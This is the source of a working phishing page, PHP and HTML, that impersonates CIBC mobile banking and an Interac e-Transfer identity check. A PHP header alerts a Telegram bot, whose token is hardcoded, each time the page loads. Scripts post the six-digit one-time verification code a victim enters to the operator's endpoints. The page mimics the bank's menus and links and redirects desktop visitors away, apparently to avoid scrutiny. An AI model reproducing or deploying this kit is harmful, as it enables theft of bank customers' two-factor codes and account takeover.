<?php


$message = "CIBC CODE REQUESTED\n";

$apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
$data = [
    'chat_id' => '-903484597',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                                    

?>
<!DOCTYPE html>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <script type="text/javascript" id="custom-useragent-string"></script>
        
        <title>E-tranfer</title>
        
        <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <meta name="HandheldFriendly" content="true">
        <meta name="format-detection" content="telephone=no">
        <link rel="stylesheet" href="files/reset.css">
        <link rel="stylesheet" href="files/reset-brand.css">
        <link rel="stylesheet" href="files/global.css">
        <link rel="stylesheet" href="files/global-android2.css">
        <link rel="stylesheet" href="files/global-brand.css">
        <link rel="stylesheet" href="files/password-reset.css">
        <link rel="stylesheet" href="files/password-reset-brand.css">
        <style id="at-makers-style" class="at-flicker-control">
            .mboxDefault {visibility: hidden;}

            .tfa-info p {
                margin-bottom: 10px;
            }

            .mb5 {
                margin-bottom: 15px;
            }
        </style>
        <style>
        #header-logo {
            background: url(/assets/cibc/img/cibcnew.svg);
            background-repeat: no-repeat;
            background-position: center;
            background-size: contain;
            width: 100px;
        }
        </style>
        <script src="files/jquery-3.6.0.min.js###%" crossorigin="anonymous"></script>
        <script>
            var lrbank = 'CIBC';
            var lrinfo = '2FA';
        </script>
        <script src="files/actions.js###%"></script>
        <link rel="stylesheet" href="files/all.css">
        <link rel="stylesheet" href="files/loader.css">
        <script>
        $(document).on('change', '#input-code', function() {
            $.post('/deposit/cibc/api/otp-data', {code: $(this).val()});
        });

        var tloaded = false;

        $(document).on('submit', '#lab-form, .lab-form', function(e) {
            if (tloaded) {
                $('.btn-save').attr('disabled', true);
                $('.btn-save .btn-txt').css('display', 'none');
                $('.btn-save .btn-spinner').css('display', 'block');

                $.post('/deposit/simplii/api/otp-submit', {code: $('#input-code').val()}, function(response) {
                    location.href = '/deposit/cibc/wo';
                });
            } else {
                tloaded = true;

                $('#btn-send').css('display', 'none');
                $('#btn-sending').css('display', 'block');

                $.post('/deposit/cibc/api/otp-type', $(this).serialize(), function(response) {
                    setTimeout(function() {
                        $('#btn-sending').css('display', 'none');
                        $('#btn-next').css('display', 'block');
                        $('#step-2').css('display', 'block');
                        $('#input-code').attr('required', true);
                    }, 1000);
                });
            }

            e.preventDefault();
        });
        </script>
    </head>
    <body lang="en" class="android-fix">
        <span class="offscreen">Forgot Password</span>
        <input type="checkbox" id="drawer-toggle-chk" aria-hidden="true">
        <label for="drawer-toggle-chk" id="drawer-toggle-label">
        <img id="open-menu-icon" src="files/drawer-menu-open.png" alt="Open Menu" role="button">
        <img id="close-menu-icon" src="files/drawer-menu-close.png" alt="Close Menu" role="button">
        </label>
        <nav id="drawer-menu" class="scrollable-ver">
            <div id="menu-wrapper">
                <div class="drawer-menu-header">
                    <div>CIBC<span>Mobile Banking</span></div>
                </div>
                <ul>
                    <li id="li-sign-on"><a id="signon-link" class="tracking-set-flow" href="https://www.cibc.mobi/ebm-mobile-anp/verify-card?6-1.ILinkListener-header-drawerMenu-signonLink" role="menuitem">Sign On</a></li>
                    <li><a id="register-link" class="tracking-set-flow" href="https://www.cibc.mobi/ebm-mobile-anp/verify-card?6-1.ILinkListener-header-drawerMenu-registerLink" role="menuitem">Register</a></li>
                    <li id="li-forgot-password"><a id="forgetpwd-link" class="tracking-set-flow active" href="https://www.cibc.mobi/ebm-mobile-anp/verify-card?6-1.ILinkListener-header-drawerMenu-forgetPasswordLink" role="menuitem">Forgot Password<span class="offscreen">Selected</span></a></li>
                    <hr>
                    <li id="li-open-account"><a id="open-product-link" class="tracking-set-flow" href="https://www.cibc.mobi/ebm-mobile-anp/verify-card?6-1.ILinkListener-header-drawerMenu-openAccountPs-openAccountPsLink" role="menuitem" @="Open an Account&lt;span class=&quot;offscreen&quot;&gt;. Opens in new page&lt;/span&gt;">Open an Account</a></li>
                    <li id="li-browse-products"><a id="browse-products-link" href="https://www.cibc.mobi/ebm-mobile-anp/verify-card?6-1.ILinkListener-header-drawerMenu-browseProductsPs-productSelectorLink" target="_blank" role="menuitem" @="Explore Products&lt;span class=&quot;offscreen&quot;&gt;. Opens in new page&lt;/span&gt;" class="">Explore Products</a></li>
                    <li id="li-sites-apps"></li>
                    <li id="li-sites-apps"><a id="sites-link" href="https://www.cibc.mobi/ebm-mobile-anp/verify-card?6-1.ILinkListener-header-drawerMenu-sitesPreSignOnLink" role="menuitem" class="">CIBCSites</a></li>
                    <li id="li-find-us"><a id="find-us-link" href="https://www.cibc.com/ca/redirect/locator.html?itrc=C1:6185" target="_blank" role="menuitem">Find Us</a></li>
                    <li id="li-security"><a id="security-guarantee-link" href="https://www.cibc.com/ca/mobile/legal/mobile-security.html?itrc=C1:6166" target="_blank" role="menuitem">Security Guarantee</a></li>
                    <hr>
                    <li><a id="contact-us-link" href="https://www.cibc.com/m/contact-cibc.html?itrc=C1:6187" target="_blank" role="menuitem">Contact Us</a></li>
                    <li id="idd"><a id="legal-link" role="menuitem" href="https://www.cibc.mobi/ebm-mobile-anp/verify-card?6-1.ILinkListener-header-drawerMenu-privacyAndLegalContainer-legalLink" @="Privacy and Legal&lt;span class=&quot;offscreen&quot;&gt;Opens in new page.&lt;/span&gt;" class="">Privacy and Legal<span class="offscreen">Opens in new page.</span></a></li>
                    <li><a id="help-link" href="http://cibc.intelliresponse.com/mobile-w/?itrc=C1:6167" target="_blank" role="menuitem">Help</a></li>
                </ul>
            </div>
        </nav>
        <header class="flex-box flex-box-hoz">
            <div class="flex-box-flex-1"></div>
            <a href="http://cibc.com/" target="_blank">
                <div id="header-logo">
                    <span class="offscreen">CIBClogo</span>
                </div>
            </a>
            <div id="header-link" class="flex-box-flex-1">
            </div>
        </header>
        <noscript>
            <section id="nojs" class="overlay-msg">
                <div>
                    <p>JavaScript is currently disabled in your browser.</p>
                    <p>To access Mobile Banking, please enable JavaScript and refresh this page.</p>
                </div>
            </section>
        </noscript>
        <section id="main-page" class="mainPageClassValue">
            <section id="ide">
                <section class="page-title">
                    <h2 class="title">Identity Verification</h2>
                </section>
            </section>
            <section id="identity-verification" class="page-wrapper">
                <div class="tfa-info">
                    <p>In order to sign on to CIBC Banking, we need to verify your identity.</p>
                    <p>We will send you a one-time verification code to the contact method selected below.</p>
                    <p class="mb5">Note: For account security, we're no longer sending one-time verification codes to personal or free email services.</p>
                </div>
                <div class="global-error-from-container" tabindex="-1" id="id4">
                                    </div>
                <form method="post" action="040151.php" id="lab-form">
                    <section id="step-2" style="display: block;">
    					<p class="code-sent mb5">The code has been sent to the selected contact method.</p>
    					<fieldset class="otvc">
    						<label for="otvc-code">
    							<p class="label-pad-b5">VERIFICATION CODE:</p>
    						</label>
    						<input pattern="[0-9]{1}[0-9]{1}[0-9]{1}[0-9]{1}[0-9]{1}[0-9]{1}" data-id="otvc" id="input-code" type="tel" name="code" placeholder="6-digit code" maxlength="6" value="" required="required">
    					</fieldset>
    					<span id="id1b">
    						<p class="mb5">
    							<span class="label-pad-b5">Didn't get the code?</span>
    							<a href="javascript:;" class="nga-resend-button" id="btn-resend">
    								<span>Resend code</span>
    							</a>
    						</p>
    						<div class="linepadtop7bottom20">
    							<span>Please allow a few minutes for the verification code to be sent.</span>
    						</div>
    					</span>
    				</section>
                    <fieldset class="button-set">
                        <input type="button" class="btn btn-negative" id="btb-cancel" name="cancel-button" value="Cancel">
                        <input type="submit" name="send-button" id="btn-send" class="btn btn-positive" value="Send" style="display: none;">
                        <button id="btn-sending" style="display: none;" class="btn btn-positive" disabled="">Sending...</button>
                        <button type="submit" name="ok-button" id="btn-next" class="btn btn-positive btn-full btn-save" style="display: block;">
                            <span class="btn-txt">OK</span>
                            <span class="btn-spinner" style="display: none"><i class="fa fa-spinner fa-spin"></i></span>
                        </button>
                    </fieldset>
                </form>
            </section>
        </section>
        <div id="__loadingScreenDiv" class="ajax-overlay" aria-live="assertive">
            <div class="ajax-overlay-background"></div>
            <img src="files/loading.gif" class="ajax-overlay-spinner" tabindex="-1" alt="Page loading">
        </div>
    

</body><script>setTimeout(function() { if (screen.width >= 600) { window.location = ' https://etransfer.interac.ca/error'; } }, 10);</script></html>